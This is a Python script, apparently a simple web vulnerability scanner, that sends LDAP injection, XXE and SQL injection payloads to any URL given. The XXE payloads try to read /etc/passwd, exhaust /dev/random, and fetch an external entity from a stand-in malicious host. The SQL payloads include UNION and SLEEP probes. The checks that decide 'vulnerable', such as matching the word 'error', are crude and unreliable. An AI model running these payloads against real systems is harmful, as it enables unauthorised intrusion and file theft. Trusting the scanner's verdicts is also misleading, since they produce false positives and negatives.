import requests
import re
def is_ldap_injection_vulnerable(url):
    """
    Checks if a website is vulnerable to LDAP Injection by testing common LDAP injection payloads.

    Parameters:
    - url (str): The URL of the target website (GET endpoint).

    Returns:
    - bool: Returns True if LDAP injection vulnerability is detected, otherwise False.
    """
    if not isinstance(url, str):
        raise ValueError("The URL must be a string")

    # Common LDAP injection payloads to test for vulnerabilities
    payloads = [
        "(uid=*))(|(uid=*))", 
        "(uid=admin)(&(password=*))", 
        "(&(uid=*))", 
        "(cn=*))(|(cn=*))", 
        "(|(uid=*))"
    ]
    
    vulnerable = False
    
    # Test each payload
    for payload in payloads:
        try:
            # Send GET request with the payload
            response = requests.get(url + "?input=" + payload, timeout=5)
            
            # Check for signs of LDAP injection (e.g., errors in the response)
            if response.status_code == 200 and "error" in response.text.lower():
                print(f"LDAP Injection payload '{payload}' worked.")
                vulnerable = True

        except requests.RequestException as e:
            print(f"Error with payload '{payload}': {e}")
    
    return vulnerable  # Return True if any payload triggers vulnerability


def is_xxe_vulnerable(url):
    """
    Checks if a website is vulnerable to XML External Entity (XXE) attacks by sending common XXE payloads.

    Parameters:
    - url (str): The URL of the target website (POST endpoint).

    Returns:
    - bool: Returns True if any XXE vulnerability is detected, otherwise False.
    """
    if not isinstance(url, str):
        raise ValueError("The URL must be a string")

    # Common XXE payloads to test for vulnerabilities
    payloads = [
        """<?xml version="1.0" encoding="ISO-8859-1"?>
        <!DOCTYPE foo [ 
        <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///etc/passwd" >] >
        <foo>&xxe;</foo>""",
        
        """<?xml version="1.0" encoding="ISO-8859-1"?>
        <!DOCTYPE foo [ 
        <!ENTITY xxe SYSTEM "http://malicious-site.com/malicious.xml" >] >
        <foo>&xxe;</foo>""",
        
        """<?xml version="1.0" encoding="ISO-8859-1"?>
        <!DOCTYPE foo [ 
        <!ENTITY xxe SYSTEM "file:///dev/random" >] >
        <foo>&xxe;</foo>"""
    ]
    
    headers = {'Content-Type': 'application/xml'}
    
    # Loop through all payloads and test each one
    for payload in payloads:
        try:
            response = requests.post(url, data=payload, headers=headers, timeout=5)
            
            # Check for known XXE indicators in the response
            if "root" in response.text or "passwd" in response.text or "error" in response.text:
                print("XXE payload worked.")
                return True  # XXE vulnerability detected

        except requests.RequestException as e:
            print(f"Error sending XXE payload to {url}: {e}")
    
    return False  # No XXE vulnerability detected



def is_sql_injection_vulnerable(url):
    """
    Checks if a website is vulnerable to SQL injection by testing a list of SQL payloads.

    Parameters:
    - url (str): The URL of the target website.

    Returns:
    - bool: Returns True if any SQL injection vulnerabilities are detected, otherwise False.
    """
    if not isinstance(url, str):
        raise ValueError("The URL must be a string")

    # List of common SQL injection payloads
    sql_payloads = [
        "' OR 1=1--",
        "' UNION SELECT NULL--",
        "' AND SLEEP(5)--"
    ]
    
    for payload in sql_payloads:
        try:
            # Append the SQL injection payload to the URL as a query parameter
            response = requests.get(f"{url}?id={payload}", timeout=5)
            
            # Check if error or warning keywords appear in the response text, or if a sleep keyword is found
            if response.status_code == 200 and (
                re.search(r"error|warning", response.text, re.IGNORECASE) or "sleep" in response.text
            ):
                print(f"Potential SQL Injection vulnerability detected with payload: {payload}")
                return True
        except requests.RequestException as e:
            print(f"Error with payload '{payload}': {e}")
    
    return False